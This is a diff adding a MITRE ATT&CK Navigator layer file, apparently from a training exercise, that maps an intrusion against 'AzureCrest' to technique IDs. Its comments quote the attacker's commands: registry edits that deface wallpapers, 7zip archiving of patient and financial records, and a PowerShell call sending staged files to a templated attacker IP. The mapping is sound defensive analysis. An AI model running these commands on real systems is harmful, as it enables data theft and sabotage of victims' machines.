@@ -1,0 +1,525 @@
+{
+	"name": "layer1",
+	"versions": {
+		"attack": "14",
+		"navigator": "4.9.4",
+		"layer": "4.5"
+	},
+	"domain": "enterprise-attack",
+	"description": "",
+	"filters": {
+		"platforms": [
+			"Linux",
+			"macOS",
+			"Windows",
+			"Network",
+			"PRE",
+			"Containers",
+			"Office 365",
+			"SaaS",
+			"Google Workspace",
+			"IaaS",
+			"Azure AD"
+		]
+	},
+	"sorting": 0,
+	"layout": {
+		"layout": "side",
+		"aggregateFunction": "average",
+		"showID": false,
+		"showName": true,
+		"showAggregateScores": false,
+		"countUnscored": false,
+		"expandedSubtechniques": "none"
+	},
+	"hideDisabled": false,
+	"techniques": [
+		{
+			"techniqueID": "T1583",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1583.001",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1592",
+			"tactic": "reconnaissance",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1594",
+			"tactic": "reconnaissance",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1005",
+			"tactic": "collection",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actor uses dbhunter to extract database files from the Database Administrator's computer.",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1567",
+			"tactic": "exfiltration",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1219",
+			"tactic": "command-and-control",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actor used AnyDesk, a remote management software, to exfiltrate the database files",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1589",
+			"tactic": "reconnaissance",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1589.002",
+			"tactic": "reconnaissance",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1589.003",
+			"tactic": "reconnaissance",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1491",
+			"tactic": "impact",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actors change the wallpapers of compromised hosts, and prevent the users from changing it back by modifying registry values. \n\nThey run these two commands:\n\ncmd.exe /c reg add 'HKCU\\\\Control Panel\\\\Desktop' /v Wallpaper /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\ItWentWrong.jpg' /f && reg add 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System' /v Wallpaper /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\ItWentWrong.jpg' /f\n\ncmd.exe /c reg add 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\ActiveDesktop' /v NoChangingWallPaper /t REG_SZ /d 1 /f && reg add 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\ActiveDesktop' /v NoChangingWallPaper /t REG_SZ /d 1 /f",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1491.001",
+			"tactic": "impact",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actors change the wallpapers of compromised hosts, and prevent the users from changing it back by modifying registry values. \n\nThey run these two commands:\n\ncmd.exe /c reg add 'HKCU\\\\Control Panel\\\\Desktop' /v Wallpaper /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\ItWentWrong.jpg' /f && reg add 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System' /v Wallpaper /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\ItWentWrong.jpg' /f\n\ncmd.exe /c reg add 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\ActiveDesktop' /v NoChangingWallPaper /t REG_SZ /d 1 /f && reg add 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\ActiveDesktop' /v NoChangingWallPaper /t REG_SZ /d 1 /f",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1595",
+			"tactic": "reconnaissance",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1087",
+			"tactic": "discovery",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1087.002",
+			"tactic": "discovery",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1087.001",
+			"tactic": "discovery",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1059",
+			"tactic": "execution",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1059.001",
+			"tactic": "execution",
+			"color": "#fd8d3c",
+			"comment": "Although the threat actor primarily uses the windows command shell throughout the attack, they used powershell once to download AnyDesk. \nThey ran the command: powershell -File C:\\\\ProgramData\\\\Heartburn\\\\anydesk_automation.ps1 -TargetIP {{actor_ip}} -Password 'thxfodacaviar' -FileToTransfer 'C:\\\\Out\\\\*'\"",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1059.003",
+			"tactic": "execution",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actor extensively leverages the Windows Command Shell (cmd.exe) to execute commands throughout the intrusion",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1074",
+			"tactic": "collection",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actor uses the     C:\\\\Out directory to stage collected data.",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1074.001",
+			"tactic": "collection",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actor uses the     C:\\\\Out directory to stage collected data.",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1204",
+			"tactic": "execution",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1204.002",
+			"tactic": "execution",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1591",
+			"tactic": "reconnaissance",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1591.004",
+			"tactic": "reconnaissance",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1590",
+			"tactic": "reconnaissance",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1590.006",
+			"tactic": "reconnaissance",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1590.004",
+			"tactic": "reconnaissance",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1048",
+			"tactic": "exfiltration",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1566",
+			"tactic": "initial-access",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1566.002",
+			"tactic": "initial-access",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actor gains initial access to AzureCrest endpoints by sending spearphishing emails to employees.",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1486",
+			"tactic": "impact",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1585",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1585.002",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1588",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "Although not directly observed, the threat actors would have needed to obtain or develop the tools they used in the intrusion in some fashion. And they leveraged a lot of tools throughout the attack:  dbhunter.exe, anydesk, heartburn, curl, ",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1588.001",
+			"tactic": "resource-development",
+			"color": "",
+			"comment": "\n",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1588.002",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "Although not directly observed, the threat actors would have needed to obtain or develop the tools they used in the intrusion in some fashion. And they leveraged a lot of tools throughout the attack:  dbhunter.exe, anydesk, heartburn, curl, ",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1033",
+			"tactic": "discovery",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actor runs \"whoami\", a well known command that  retrieves the username of the currently logged-in user.",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1069",
+			"tactic": "discovery",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1560",
+			"tactic": "collection",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actor uses 7zip to compress the database files and prepare them for exfiltration.\n\nCommands run:\n7z.exe a -t7z C:\\\\Out\\\\Financial_Records.7z C:\\\\Out\\\\*financial*.db -p finnaberich\n7z.exe a -t7z C:\\\\Out\\\\Patient_Records.7z C:\\\\Out\\\\*patient*.sql -p i<3mulah\n7z.exe a -t7z C:\\\\Out\\\\Roys_Meme_Collection.7z C:\\\\Out\\\\",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1560.001",
+			"tactic": "collection",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actor uses 7zip to compress the database files and prepare them for exfiltration.\n\nCommands run:\n7z.exe a -t7z C:\\\\Out\\\\Financial_Records.7z C:\\\\Out\\\\*financial*.db -p finnaberich\n7z.exe a -t7z C:\\\\Out\\\\Patient_Records.7z C:\\\\Out\\\\*patient*.sql -p i<3mulah\n7z.exe a -t7z C:\\\\Out\\\\Roys_Meme_Collection.7z C:\\\\Out\\\\",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1608",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actors uploaded tools like anydesk_automation.ps1, dbhunter.exe, UrTottalyPwned.bat onto their domains in order to later download them onto compromised hosts.",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1608.001",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actors uploaded tools like anydesk_automation.ps1, dbhunter.exe, UrTottalyPwned.bat onto their domains in order to later download them onto compromised hosts.",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1608.002",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "The Threat Actors uploaded tools like anydesk_automation.ps1, dbhunter.exe, UrTottalyPwned.bat onto their domains in order to later download them onto compromised hosts.",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1105",
+			"tactic": "command-and-control",
+			"color": "#fd8d3c",
+			"comment": "After gaining access to victim hosts, the Threat Actor downloads a number of custom & commodity tools to help them conduct further activities.\n\nThese files are downloaded from actor-controlled domains using tools like curl.",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1587",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1587.001",
+			"tactic": "resource-development",
+			"color": "#fd8d3c",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"links": [],
+			"showSubtechniques": false
+		}
+	],
+	"gradient": {
+		"colors": [
+			"#ff6666ff",
+			"#ffe766ff",
+			"#8ec843ff"
+		],
+		"minValue": 0,
+		"maxValue": 100
+	},
+	"legendItems": [],
+	"metadata": [],
+	"links": [],
+	"showTacticRowBackground": false,
+	"tacticRowBackground": "#dddddd",
+	"selectTechniquesAcrossTactics": true,
+	"selectSubtechniquesWithParent": false,
+	"selectVisibleTechniques": false
+}
